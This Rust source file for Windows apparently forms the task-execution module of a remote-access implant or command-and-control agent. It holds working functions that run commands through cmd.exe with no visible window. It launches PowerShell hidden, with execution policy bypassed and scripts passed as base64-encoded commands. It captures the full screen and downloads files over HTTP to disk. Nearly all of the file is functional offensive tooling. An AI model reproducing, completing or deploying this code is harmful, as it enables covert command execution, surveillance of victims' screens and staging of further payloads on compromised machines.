use std::mem;
use std::ptr;

use base64::Engine;
use crate::http::HttpClient;
use crate::win32;

#[derive(Debug)]
pub struct ExecResult {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: u32,
}

fn create_inheritable_pipe(
    read_handle: &mut win32::HANDLE,
    write_handle: &mut win32::HANDLE,
) -> bool {
    unsafe {
        let mut sa: win32::SECURITY_ATTRIBUTES = mem::zeroed();
        sa.nLength = mem::size_of::<win32::SECURITY_ATTRIBUTES>() as u32;
        sa.bInheritHandle = win32::TRUE;

        if win32::CreatePipe(read_handle, write_handle, &sa, 0) == 0 {
            return false;
        }
        win32::SetHandleInformation(*read_handle, win32::HANDLE_FLAG_INHERIT, 0);
        true
    }
}

fn read_pipe(pipe: win32::HANDLE) -> Vec<u8> {
    let mut result = Vec::new();
    let mut buf = [0u8; 4096];
    unsafe {
        loop {
            let mut bytes_read: u32 = 0;
            if win32::ReadFile(
                pipe,
                buf.as_mut_ptr() as *mut _,
                buf.len() as u32,
                &mut bytes_read,
                ptr::null_mut(),
            ) == 0
            {
                break;
            }
            if bytes_read == 0 {
                break;
            }
            result.extend_from_slice(&buf[..bytes_read as usize]);
        }
        win32::CloseHandle(pipe);
    }
    result
}

unsafe fn spawn_process(
    command_line: &str,
    timeout_ms: u32,
) -> Option<ExecResult> {
    let mut stdout_read: win32::HANDLE = 0;
    let mut stdout_write: win32::HANDLE = 0;
    let mut stderr_read: win32::HANDLE = 0;
    let mut stderr_write: win32::HANDLE = 0;

    if !create_inheritable_pipe(&mut stdout_read, &mut stdout_write) {
        return None;
    }
    if !create_inheritable_pipe(&mut stderr_read, &mut stderr_write) {
        win32::CloseHandle(stdout_read);
        win32::CloseHandle(stdout_write);
        return None;
    }

    let mut si: win32::STARTUPINFOW = mem::zeroed();
    si.cb = mem::size_of::<win32::STARTUPINFOW>() as u32;
    si.dwFlags = win32::STARTF_USESTDHANDLES;
    si.hStdOutput = stdout_write;
    si.hStdError = stderr_write;
    si.hStdInput = win32::GetStdHandle(win32::STD_INPUT_HANDLE);

    let mut pi: win32::PROCESS_INFORMATION = mem::zeroed();

    let cmd_wide: Vec<u16> =
        command_line.encode_utf16().chain(std::iter::once(0)).collect();

    let result = win32::CreateProcessW(
        ptr::null(),
        cmd_wide.as_ptr() as *mut u16,
        ptr::null_mut(),
        ptr::null_mut(),
        win32::TRUE,
        0x08000000, // CREATE_NO_WINDOW
        ptr::null_mut(),
        ptr::null(),
        &si,
        &mut pi,
    );

    win32::CloseHandle(stdout_write);
    win32::CloseHandle(stderr_write);

    if result == 0 {
        win32::CloseHandle(stdout_read);
        win32::CloseHandle(stderr_read);
        return None;
    }

    win32::WaitForSingleObject(pi.hProcess, timeout_ms);

    let mut exit_code: u32 = 0;
    win32::GetExitCodeProcess(pi.hProcess, &mut exit_code);

    let stdout = String::from_utf8_lossy(&read_pipe(stdout_read)).to_string();
    let stderr = String::from_utf8_lossy(&read_pipe(stderr_read)).to_string();

    win32::CloseHandle(pi.hProcess);
    win32::CloseHandle(pi.hThread);

    Some(ExecResult {
        stdout,
        stderr,
        exit_code,
    })
}

pub fn execute_cmd(command: &str, timeout_ms: u32) -> Option<ExecResult> {
    let full_cmd = format!("cmd.exe /C {}", command);
    unsafe { spawn_process(&full_cmd, timeout_ms) }
}

pub fn execute_raw(command: &str, timeout_ms: u32) -> Option<ExecResult> {
    unsafe { spawn_process(command, timeout_ms) }
}

pub fn execute_powershell(script: &str, timeout_ms: u32) -> Option<ExecResult> {
    let utf16: Vec<u16> = script.encode_utf16().collect();
    let b64 = engine().encode(
        utf16.iter()
            .flat_map(|&c| c.to_le_bytes())
            .collect::<Vec<_>>(),
    );
    let cmd = format!(
        "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand {}",
        b64
    );
    execute_raw(&cmd, timeout_ms)
}

pub fn execute_sleep(seconds: u64) -> ExecResult {
    std::thread::sleep(std::time::Duration::from_secs(seconds));
    ExecResult {
        stdout: format!("slept for {}s", seconds),
        stderr: String::new(),
        exit_code: 0,
    }
}

pub fn take_screenshot() -> Option<Vec<u8>> {
    unsafe {
        let hdc_screen = win32::GetDC(0);
        if hdc_screen == 0 {
            return None;
        }

        let width = win32::GetDeviceCaps(hdc_screen, win32::DESKTOPHORZRES);
        let height = win32::GetDeviceCaps(hdc_screen, win32::DESKTOPVERTRES);

        let hdc_mem = win32::CreateCompatibleDC(hdc_screen);
        if hdc_mem == 0 {
            win32::ReleaseDC(0, hdc_screen);
            return None;
        }

        let hbitmap = win32::CreateCompatibleBitmap(hdc_screen, width, height);
        if hbitmap == 0 {
            win32::DeleteDC(hdc_mem);
            win32::ReleaseDC(0, hdc_screen);
            return None;
        }

        win32::SelectObject(hdc_mem, hbitmap);
        win32::BitBlt(
            hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, win32::SRCCOPY,
        );

        let mut bmp_info: win32::BITMAPINFO = mem::zeroed();
        bmp_info.bmiHeader.biSize = mem::size_of::<win32::BITMAPINFOHEADER>() as u32;
        bmp_info.bmiHeader.biWidth = width;
        bmp_info.bmiHeader.biHeight = -height;
        bmp_info.bmiHeader.biPlanes = 1;
        bmp_info.bmiHeader.biBitCount = 24;
        bmp_info.bmiHeader.biCompression = win32::BI_RGB;

        let row_size = ((width * 24 + 31) / 32) * 4;
        let pixel_size = (row_size * height) as usize;
        let mut pixels = vec![0u8; pixel_size];

        win32::GetDIBits(
            hdc_mem,
            hbitmap,
            0,
            height as u32,
            pixels.as_mut_ptr() as *mut _,
            &mut bmp_info,
            win32::DIB_RGB_COLORS,
        );

        win32::DeleteObject(hbitmap);
        win32::DeleteDC(hdc_mem);
        win32::ReleaseDC(0, hdc_screen);

        Some(pixels)
    }
}

pub fn download_file(client: &HttpClient, url: &str, path: &str) -> bool {
    let resp = client.request("GET", url, &[], None);
    match resp {
        Some(r) if r.status == 200 => {
            if let Some(parent) = std::path::Path::new(path).parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            std::fs::write(path, &r.body).is_ok()
        }
        _ => false,
    }
}

fn engine() -> base64::engine::GeneralPurpose {
    base64::engine::general_purpose::STANDARD
}
